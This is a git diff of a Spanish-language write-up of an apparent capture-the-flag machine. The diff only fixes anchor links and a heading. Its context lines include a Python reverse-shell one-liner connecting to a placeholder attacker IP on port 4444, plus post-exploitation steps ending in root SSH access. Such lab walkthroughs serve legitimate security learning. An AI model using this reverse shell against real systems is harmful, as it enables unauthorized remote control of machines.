@@ -109,7 +109,7 @@ He estado probando a introducir código ***Python***, ***PHP*** (el cual parece 
 python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("IP_KALI",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
 ```
 
->Explicación de porqué este script si funciona: ***[`python3 -c '...`](#python3--c-'...)***
+>Explicación de porqué este script si funciona: ***[`python3 -c '...`](#python3--c-)***
 # <font color=red>[+]</font> Post-Explotación
 
 Obtenemos acceso al sistema como el usuario `paradox`:
@@ -434,7 +434,7 @@ find / -name "tuxling_*" 2>/dev/null
 /media/tuxling_2
 ```
 
-Lo encontramos!! El último fragmento que nos falta se encuentra el el directorio `/medi/tuxling_2/` en el cual encontramos una nueva nota, una clave privada y un fragmento con la extensión `.asc`. Para más información sobre ***[PGP (Pretty Good Privacy)](#pgp-(pretty-good-privacy)***.
+Lo encontramos!! El último fragmento que nos falta se encuentra el el directorio `/medi/tuxling_2/` en el cual encontramos una nueva nota, una clave privada y un fragmento con la extensión `.asc`. Para más información sobre ***[PGP (Pretty Good Privacy)](#pgp-pretty-good-privacy)***.
 
 Tenemos el mensaje cifrado `.asc` y la clave privada `.key`. Aunque la clave está en formato binario y nosotros no podemos leerla, no es un problema para la herramienta `gpg`, ya que el programa entiendo perfectamente el formato crudo.
 ##### Descifrar mensaje PGP
@@ -468,7 +468,7 @@ Dentro del directorio `/home/varg` encontramos varias cosas interesantes. La pri
 /usr/bin/python3: can't open file './CooctOS.py': [Errno 13] Permission denied
 ```
 
->Para saber el porque: ***[Python3 Permission denied](#python3-permissin-denied)***.
+>Para saber el porque: ***[Python3 Permission denied](#python3-permission-denied)***.
 
 Pasando a otras cosas, vemos un directorio `/cooctOS_src` al cual podemos acceder gracias a que pertenecemos al grupo `os_tester`. Cuando entramos en este directorio vemos que parece ser un pequeño sistema operativo y que contiene un `.git`. Dentro de este directorio encontramos que se realizó un *commit* en el que se especificaba que se había eliminado el sistema de login.
 
@@ -525,7 +525,7 @@ ssh root@$IP -i id_rsa_root
 ---
 # Explicaciones
 
-# `python3 -c '...`
+## `python3 -c '...`
 
 Cuando descubrí la zona web en la que debía de introducir código ***Python*** estuve probando varios scripts *One-Liner* con los que poder realizar, no solo reverse shells, sino también comandos simples como `print` o `os.system('id')` sin éxito.
 
